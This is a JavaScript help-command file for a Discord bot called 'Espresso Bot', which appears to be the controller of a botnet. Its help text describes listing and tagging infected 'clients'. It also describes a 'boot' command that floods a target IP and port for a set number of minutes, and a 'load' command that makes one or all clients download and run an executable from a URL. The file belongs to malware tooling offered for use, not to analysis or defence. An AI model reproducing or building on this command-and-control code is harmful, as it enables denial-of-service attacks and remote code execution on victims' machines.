exports.run = (client, message, args) => {
    switch (args[0]) {
        case "help":
            message.channel.send(`\`\`\`
Command Name: ${client.settings.fallbackPrefix}help
Description: Shows usage info about the specified command
Usage: ${client.settings.fallbackPrefix}help [Command Name]
Examples:
  ${client.settings.fallbackPrefix}help        Shows main help page
  ${client.settings.fallbackPrefix}help boot   Shows info about the boot command
\`\`\``);
            break;
        case "clients":
            message.channel.send(`\`\`\`
Command Name: ${client.settings.fallbackPrefix}clients
Description: Shows clients or info about them
Usage: ${client.settings.fallbackPrefix}clients [Client ID|Client Tag]
Examples:
  ${client.settings.fallbackPrefix}clients                 Shows all registered clients 
  ${client.settings.fallbackPrefix}clients 32              Shows info about the client with ID 32
  ${client.settings.fallbackPrefix}clients workstation5    Shows info about the client with Tag workstation5
\`\`\``);
            break;
        case "tag":
            message.channel.send(`\`\`\`
Command Name: ${client.settings.fallbackPrefix}tag
Description: Sets tag to the specified client
Usage: ${client.settings.fallbackPrefix}tag <ID> <Tag>
Examples:
   ${client.settings.fallbackPrefix}tag 12 workstation3  Sets Tag workstation3 to clients with ID 12 
\`\`\``);
            break;
        case "boot":
            message.channel.send(`\`\`\`
Command Name: ${client.settings.fallbackPrefix}boot
Description: Sets flooding instructions for all online clients
Usage: ${client.settings.fallbackPrefix}boot <IP|Action> [Port] [Minutes]
Examples:
    ${client.settings.fallbackPrefix}boot 213.12.98.7 8080 5    Floods target IP at set port for 5 minutes
    ${client.settings.fallbackPrefix}boot status                Shows the boot instructions
    ${client.settings.fallbackPrefix}boot stop                  Removes the boot instructions
\`\`\``);
            break;
        case "load":
            message.channel.send(`\`\`\`
Command Name: ${client.settings.fallbackPrefix}load
Description: Sets file for speciffic or all clients to run
Usage: ${client.settings.fallbackPrefix}load [ID|all] [URL|Acton] 
Examples:
    ${client.settings.fallbackPrefix}load 12 http://mysite/myfile.exe     Runs myfile.exe at clients with set ID
    ${client.settings.fallbackPrefix}load all http://mysite/myfile.exe    Runs myfile.exe at all clients
    ${client.settings.fallbackPrefix}load 34 status                       Shows run status for clients with ID 34
\`\`\``);
            break;
        default:
            message.channel
                .send(`\`\`\`      ██    ██    ██                                    
    ██      ██  ██                                      
    ██    ██    ██                                      
      ██  ██      ██                                    
      ██    ██    ██                                    
                                                        
  ████████████████████                                  
  ██                ██████                              
  ██                ██  ██                              
  ██                ██  ██                              
  ██                ██████                              
    ██            ██                                    
████████████████████████                                
██                    ██     Espresso Bot ${client.settings.version}                         
  ████████████████████

Available Commands:
  ${client.settings.fallbackPrefix}help [CMD]                      Shows usage info    
  ${client.settings.fallbackPrefix}clients [ID|Tag]                Shows clients and info about them
  ${client.settings.fallbackPrefix}tag <ID> <Tag>                  Sets tag to a set client
  ${client.settings.fallbackPrefix}boot <IP|Action> [Port] [Mins]  Sets boot instructions for all clients
  ${client.settings.fallbackPrefix}load [ID|all] [URL|Action]      Sets file for set or all clients to run\`\`\``);
            break;
    }
};
